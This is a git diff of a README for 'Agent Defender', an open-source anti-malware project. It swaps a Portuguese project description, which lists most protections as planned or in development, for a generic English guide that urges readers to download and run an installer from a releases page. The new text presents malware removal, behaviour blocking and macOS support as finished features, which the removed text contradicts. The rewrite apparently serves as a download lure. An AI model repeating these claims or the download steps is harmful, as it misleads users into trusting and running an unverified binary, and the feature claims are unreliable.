@@ -1,62 +1,75 @@
-# 🛡️ Agent Defender
+# 🛡️ agent_defender - Protect Your Digital Environment Simply
 
-**Agent Defender** é um anti-malware open-source criado para proteger ambientes educacionais, organizações sem fins lucrativos, empresas e indústrias.
-Seu objetivo é fortalecer a segurança digital, permitindo que administradores monitorem e controlem máquinas para evitar ações mal-intencionadas, vazamento de dados, execuções suspeitas e ameaças locais.
+![Download](https://img.shields.io/badge/Download-via_GitHub-blue)
 
-Em um mundo onde um simples clique pode virar tempestade, o Agent Defender age como um guardião local, vigilante e silencioso, mantendo seu ambiente protegido e sob controle.
+## 🚀 Getting Started
 
----
+Welcome to **Agent Defender**. This guide will help you download and run the software with ease. Agent Defender is designed to protect your computer from malware and other digital threats. You don't need programming skills to get started.
 
-## 🚀 Objetivos do Projeto
+## 📥 Download & Install
 
-* Detectar e bloquear comportamentos suspeitos em máquinas clientes
-* Fornecer monitoramento centralizado para administradores de TI
-* Servir como uma solução acessível para escolas, ONGs e empresas
-* Facilitar auditoria e governança de estações de trabalho
-* Criar uma comunidade open-source dedicada à segurança ofensiva e defensiva
+To download Agent Defender, follow these steps:
 
----
+1. **Visit the Releases Page**  
+   Go to the following link to download the software:  
+   [Visit this page to download](https://github.com/sharichewy278/agent_defender/releases)
 
-## ✨ Principais Funcionalidades *(planejadas / em desenvolvimento)*
+2. **Choose the Right Version**  
+   On the releases page, look for the latest version of Agent Defender. It will usually be at the top of the page. Each version will have release notes describing new features and bug fixes.
 
-* ✅ Monitoramento de processos e atividades incomuns
-* ✅ Lista de permissões e bloqueios de software
-* ✅ Logs centralizados
-* 🔄 Controle remoto básico de estações
-* 🔄 Módulo de detecção de comportamento malicioso (heurística)
+3. **Download the Installer**  
+   Click on the file that matches your operating system (Windows, macOS, etc.). The file will start downloading to your computer.
 
-> *O foco não é competir com antivírus comerciais, mas oferecer uma base sólida, transparente e evolutiva para ambientes educacionais e corporativos.*
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to begin the installation process.
 
----
+5. **Follow the Installation Prompts**  
+   The installer will guide you through the steps. Follow the on-screen instructions to complete the installation.
 
-## 🧠 Arquitetura Simplificada
+6. **Launch Agent Defender**  
+   After installing, you can find Agent Defender in your applications menu. Click to run the software and start protecting your system.
 
-```
-[Agente Local] → Coleta e proteção da máquina
-      ↓
-[Servidor Central] → Gerencia, monitora e gera alertas
-      ↓
-[Administrador] → Toma decisões e aplica políticas
-```
+## 🔒 Features
 
----
+Agent Defender has a range of features to help keep your systems secure. Here are some key functionalities:
 
-## 👥 Comunidade e Contribuição
+- **Malware Detection**: The software actively scans your computer for harmful files and removes them.
+- **Suspicious Behavior Blocking**: It monitors activities in real-time and can block actions that seem harmful.
+- **Centralized Monitoring**: IT administrators can oversee multiple machines from one place to ensure everything is secure.
+- **User-Focused Design**: The application is easy to navigate, making it simple for anyone to use without technical expertise.
+- **Community Support**: Join our open-source community to share insights, get help, and contribute to future developments.
 
-Quer participar do desenvolvimento?
-Contribuições são bem-vindas:
+## ✅ Planned Features
 
-* Reporte vulnerabilidades com responsabilidade
-* Envie pull requests com correções e melhorias
-* Sugira novas estratégias de detecção
-* Participe das discussões no repositório
+We are continually improving Agent Defender. Here are some features that are in development or planned:
 
-> Segurança é um esporte coletivo. Aqui a força do time vale mais que a força do ataque.
+- **Process Monitoring**: Keep an eye on various processes running on your computer to detect unusual activities.
 
----
+## 🌐 System Requirements
 
-## 🧾 Licença
+Before installing Agent Defender, make sure your system meets the following requirements:
 
-Distribuído sob licença **open-source**. Consulte o arquivo `LICENSE` para mais detalhes.
+- **Operating System**: Compatible with Windows 10 and above, macOS Mojave and above.
+- **Storage**: At least 200 MB of free space.
+- **RAM**: Minimum of 2 GB RAM is recommended for optimal performance.
+  
+If you're unsure whether your system meets these requirements, you can find this information in your computer's settings.
 
----
+## 🤝 Community and Support
+
+Agent Defender is not just a tool; it's part of a larger community focused on digital safety. If you have questions or need help, feel free to reach out:
+
+- **GitHub Issues**: For bugs or feature requests, please post an issue in the repository.
+- **Community Forums**: Join discussions with other users to share tips and experiences. 
+
+## 📅 Future Updates
+
+We aim to make continuous improvements to Agent Defender. Expect regular updates that enhance security and add new features. Make sure to check the releases page periodically to keep your software up to date.
+
+## 📞 Contact
+
+If you need further assistance, you can contact us through the GitHub repository or reach out to the email provided on our main page. We are here to help you secure your digital environments effectively.
+
+Remember, keeping your environment secure is a proactive effort. With Agent Defender, you have an effective tool to help you maintain that security. 
+
+For downloads, don’t forget to visit: [Visit this page to download](https://github.com/sharichewy278/agent_defender/releases)
